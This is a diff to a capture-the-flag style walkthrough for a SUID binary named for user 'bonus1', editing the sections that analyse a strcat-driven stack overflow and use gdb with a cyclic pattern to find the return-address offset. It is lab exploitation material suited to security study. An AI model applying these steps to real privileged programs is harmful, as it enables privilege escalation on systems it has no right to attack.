@@ -51,7 +51,7 @@ pp(s);
 puts(s);
 ```
 
-## 3. Disassemble / Analyse the binary
+## 3. Analyse the vulnerability
 
 The binary is owned by `bonus1` and has the SUID bit set. It therefore runs
 with `bonus1` privileges.
@@ -65,55 +65,19 @@ saved registers until hitting a null byte, roughly 44 bytes into `dest`.
 adding another ~24 bytes. The combined ~68-byte write overflows the 42-byte
 `s[]` and corrupts `main()`'s saved return address.
 
-The disassembly of `main` confirms that `s` is allocated at `esp+0x16`:
-
-```gdb
-(gdb) disas main
-   0x080485a4 <+0>:   push   ebp
-   0x080485a5 <+1>:   mov    ebp,esp
-   0x080485a7 <+3>:   and    esp,0xfffffff0
-   0x080485aa <+6>:   sub    esp,0x40
-   0x080485ad <+9>:   lea    eax,[esp+0x16]
-   0x080485b1 <+13>:  mov    DWORD PTR [esp],eax
-   0x080485b4 <+16>:  call   0x804851e <pp>
-   0x080485b9 <+21>:  lea    eax,[esp+0x16]
-   0x080485bd <+25>:  mov    DWORD PTR [esp],eax
-   0x080485c0 <+28>:  call   0x80483b0 <puts@plt>
-   0x080485c5 <+33>:  mov    eax,0x0
-   0x080485ca <+38>:  leave
-   0x080485cb <+39>:  ret
-```
-
 ## 4. Find the offset
 
-Start GDB, strip the environment variables that shift the stack, and break
-after `pp` returns. Provide any safe input when `pp` prompts during `r`:
+Start GDB and strip the environment variables that shift the stack (this also
+keeps addresses stable later, in section 5):
 
 ```gdb
 (gdb) unset env COLUMNS
 (gdb) unset env LINES
-(gdb) b *main+21
-(gdb) r
 ```
 
-Read `s`'s address and `main()`'s return address slot. `$ebp+4` always holds
-the return address of the current function:
-
-```gdb
-(gdb) p/x $esp + 0x16
-$1 = 0xbffffc46
-(gdb) x/xw $ebp + 4
-0xbffffc7c:   0xb7e454d3
-```
-
-The distance from `s` to the return address:
-
-```text
-0xbffffc7c - 0xbffffc46 = 0x36 = 54 bytes
-```
-
-Verify with a cyclic pattern inside GDB. The return address is written by the
-`strcat` pass, so place the pattern in the second input only:
+Section 3 shows the `strcat` pass is what reaches far enough to corrupt the
+return address, so place a cyclic pattern in the second input only (the first
+input can stay a harmless `A`×20), and let the program run to completion:
 
 ```gdb
 (gdb) r < <(python -c 'print "A"*20'; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa"')
@@ -121,7 +85,8 @@ Verify with a cyclic pattern inside GDB. The return address is written by the
 
 GDB catches the SIGSEGV and shows `EIP = 0x41336141`. Stored in little-endian that is `Aa3A`, which
 begins at **byte 9** of the pattern. The return address therefore starts at
-**byte 9 of the second input**.
+**byte 9 of the second input** — that's the only number the exploit actually
+needs.
 
 Stack layout after `pp()` returns:
 
